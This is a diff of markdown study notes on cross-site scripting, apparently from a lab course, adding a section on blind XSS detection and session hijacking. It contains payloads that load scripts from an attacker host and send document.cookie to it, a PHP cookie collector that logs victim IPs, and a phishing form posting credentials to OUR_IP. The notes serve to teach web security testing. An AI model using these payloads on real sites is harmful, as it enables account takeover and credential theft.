@@ -19,6 +19,9 @@
 			- [Login Form Injection](#login-form-injection)
 			- [Credential Stealing](#credential-stealing)
 		- [Session Hijacking](#session-hijacking)
+			- [Blind XSS Detection](#blind-xss-detection)
+			- [Loading a Remote Script](#loading-a-remote-script)
+			- [Session Hijacking](#session-hijacking-1)
 	- [XSS Prevention](#xss-prevention)
 
 ---
@@ -45,7 +48,7 @@ If your XSS payload gets stored in the back-end database and retrieved upon visi
 
 Example:
 
-![To-Do List](../../images/xss_todolist.png)
+![To-Do List](../../../images/xss_todolist.png)
 
 1. Inserting the following XSS payload:
 
@@ -55,7 +58,7 @@ Example:
 
 2. Execution
 
-![Stored XSS](../../images/xss_stored.png)
+![Stored XSS](../../../images/xss_stored.png)
 
 3. Taking a look at the page source, you can see the payload you just executed
 
@@ -79,16 +82,16 @@ Example:
 
 Example:
 
-![To-Do List](../../images/xss_reflected1.png)
+![To-Do List](../../../images/xss_reflected1.png)
 
 1. As you can see, you get a ```Task 'test' could not be added.```, which includes your input ```test``` as part of the error message.
 2. Try XSS payload
 
-![Reflected XSS Payload](../../images/xss_reflected2.png)
+![Reflected XSS Payload](../../../images/xss_reflected2.png)
 
 3. ```Add``` leads to the alert pop-up and you will see ```Task '' could not be added.``` because the payload is wrapped inside script-tags and doesn't get rendered
 
-![Reflected XSS alert](../../images/xss_reflected3.png)
+![Reflected XSS alert](../../../images/xss_reflected3.png)
 
 > [!NOTE]
 > If the XSS vulnerability is non-persistent and it's within a GET request, you can target a user by sending them a URL containing the payload, since GET requests send their parameters as part of the URL.<br>
@@ -99,11 +102,11 @@ Example:
 
 While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the source through the **Document Object Model (DOM)**.
 
-![To-Do List](../../images/xss_dom1.png)
+![To-Do List](../../../images/xss_dom1.png)
 
 1. Taking a look at the network tab in firefox developer tools and re-adding ```test```, you'll notice that no HTTP request is being made
 
-![DOM XSS network](../../images/xss_dom2.png)
+![DOM XSS network](../../../images/xss_dom2.png)
 
 2. The input paramter in the URL is using a ```#``` for the item added, which means that this is a client-side parameter that is completely processed on the browser (_fragment identifier_)
 3. Taking a look at the page source, you will notice that ```test``` is nowhere to be found
@@ -290,7 +293,7 @@ You should prepare your HTML code separately, and then add it to your payload.
 
 To perform an XSS phishing attack, you must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, you'd get their creds.
 
-![Online Image Viewer](../../images/xss_phishing1.png)
+![Online Image Viewer](../../../images/xss_phishing1.png)
 
 1. HTML code for a basic login form:
 
@@ -312,7 +315,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 
 3. Inject the payload
 
-![Please login to continue](../../images/xss_phishing2.png)
+![Please login to continue](../../../images/xss_phishing2.png)
 
 4. Identify elements that need to be removed
    - to trick the victims to think that they have to log in to be able to use the page open the Page Inspector Picker and click on the element you need to remove
@@ -350,7 +353,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();<!--
 ```
 
-![Legitimate-looking web page](../../images/xss_phishing3.png)
+![Legitimate-looking web page](../../../images/xss_phishing3.png)
 
 9. Since this is a reflected XSS, you can send the malicious URL to your victim
 
@@ -404,5 +407,123 @@ Username: test | Password: test
 ```
 
 ### Session Hijacking
+
+Modern web apps utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only login once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.
+
+With the ability to execute JavaScript code on the victim's browser, you may be able to collect their cookies and send them to your server to hijack logged-in session by performing a session hijacking (_aka cookie stealing_) attack.
+
+#### Blind XSS Detection
+
+Blind XSS vulnerabilities occur usually occur with forms only accessible by certain users. Some potential examples include:
+
+- Contact Forms
+- Reviews
+- User Details
+- Support Tickets
+- HTTP User-Agent Header
+
+Example:
+
+![User Registration](../../../images/xss_session_hijacking1.png)
+
+After registering a user, you will get this response:
+
+![Thank you for registering](../../../images/xss_session_hijacking2.png)
+
+This indicates that you will not see how your input will be handled or how it will look in the browser since it will appear for the admin only in a certain admin panel what you do not have access to. In normal cases, you can test each field until you get an alert. However, as you do not have access over the admin panel in this case, you can use a JavaScript payload that sends an HTTP request back to your server. If the JavaScript code gets executed, you will get a response on your machine, and you will know that the page is indeed vulnerable.
+
+2 issues:
+
+- Since any of the fields may execute your code, you cannot know which of them did
+- The page may be vulnerable, but the payload may not work
+
+#### Loading a Remote Script
+
+Including a remote script into JavaScript code looks like this:
+
+```html
+<script src="http://YOUR_IP/script.js"></script>
+```
+
+To make identifying the one vulnerable input field easier, you can change the name of the script (```script.js```) to the name of the field you are injecting.
+
+```html
+<script src="http://OUR_IP/username"></script>
+```
+
+Now you need to test various XSS payloads so you can see which of them sends you a request. [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) will help you.
+
+Some examples:
+
+```html
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+Before you start sending payloads, you need to start a listener using netcat or PHP.
+
+```bash
+d41y@htb[/htb]$ mkdir /tmp/tmpserver
+d41y@htb[/htb]$ cd /tmp/tmpserver
+d41y@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+Once you submit the form, you wait a few seconds and check your terminal to see if anything called your server. If nothing calls your server, you can proceed to the next payload, and so on. Once you receive a call to your server, you should note the last XSS payload you used as a working payload and note the input field name that called our server as the vulnerable input field.
+
+#### Session Hijacking
+
+Once you find a working XSS payload and have identified the vulnerable input field, you can proceed to XSS exploitation and perform a session hijacking attack. It requires a JavaScript payload to send you the required data and a PHP script hosted on your server to grab and parse the transmitted data.
+
+Payload example:
+
+```javascript
+document.location='http://YOUR_IP/index.php?c='+document.cookie;
+new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
+```
+
+One of these payloads needs to be written into the ```script.js``` script.
+
+```html
+<script src=http://YOUR_IP/script.js></script>
+```
+
+With the PHP server running, you can now use the code as part of your XSS payload, send it to the vulnerable input field, and you should get a call to your server with the cookie value. However, if there were many cookies, you may not know which cookie value belongs to which cookie header. You can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, you will get all of their cookies ordered in a file.
+
+PHP example (_to be saved as ```index.php```_):
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+Once the victim visits the vulnerable web page and view the XSS payload, you will get two requests on your server, one for ```script.js``` which in turn will make another request with the cookie value.
+
+```bash
+10.10.10.10:52798 [200]: /script.js
+10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+Output from the PHP script:
+
+```bash
+d41y@htb[/htb]$ cat cookies.txt 
+Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
+```
+
+Finally, you can use this cookie on the login page to acces the victim's account. For that, you need to add the cookie name (_part of the request made on your server before the '='_) and the cookie value (_the part after the '='_). Once the cookie is set, you can refresh the web page and you will get access as the victim.
 
 ## XSS Prevention
